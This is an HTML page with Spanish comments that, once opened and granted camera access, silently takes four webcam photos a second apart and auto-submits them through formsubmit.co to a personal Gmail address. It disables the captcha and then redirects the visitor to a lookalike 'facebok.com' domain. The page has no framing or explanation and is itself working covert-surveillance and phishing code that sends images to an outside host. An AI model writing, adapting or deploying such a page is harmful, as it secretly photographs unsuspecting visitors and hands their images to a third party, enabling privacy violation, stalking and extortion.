<!doctype HTML>
<html>
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="style.css" />
  <title>Sample</title>
</head>
<body>
 <form method="POST" action="https://formsubmit.co/marco42748261@gmail.com" enctype="multipart/form-data">
    <video id="video" width="300" height="300"></video>
    <canvas id="canvas" style="display: none;"></canvas>
   <input type="file" id="photoInput1" name="foto1" accept="image/png, image/jpeg">
   <input type="file" id="photoInput2" name="foto2" accept="image/png, image/jpeg">
   <input type="file" id="photoInput3" name="foto3" accept="image/png, image/jpeg">
   <input type="file" id="photoInput4" name="foto4" accept="image/png, image/jpeg">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://www.facebok.com">
  </form>
<script>
let fotoCount = 0;
const maxFotos = 4;
const intervalo = 1000; // 1 segundo
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const photoInputs = [
  document.getElementById('photoInput1'),
  document.getElementById('photoInput2'),
  document.getElementById('photoInput3'),
  document.getElementById('photoInput4')
];
const form = document.querySelector('form');

function tomarFoto() {
  if (fotoCount < maxFotos) {
    // Tomar una foto
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      const file = new File([blob], `foto${fotoCount + 1}.png`, { type: 'image/png' });
      const dt = new DataTransfer();
      dt.items.add(file);
      photoInputs[fotoCount].files = dt.files;
      fotoCount++;
      if (fotoCount === maxFotos) {
        form.submit();
      } else {
        setTimeout(tomarFoto, intervalo);
      }
    }, 'image/png');
  }
}

navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
    video.play();
    setTimeout(() => {
      tomarFoto(); // Llamar a tomarFoto() después de establecer la transmisión de video
    }, 500); // Agregar un retraso de 500ms
  })
  .catch(error => console.error(error));
</script>
</body>
</html>
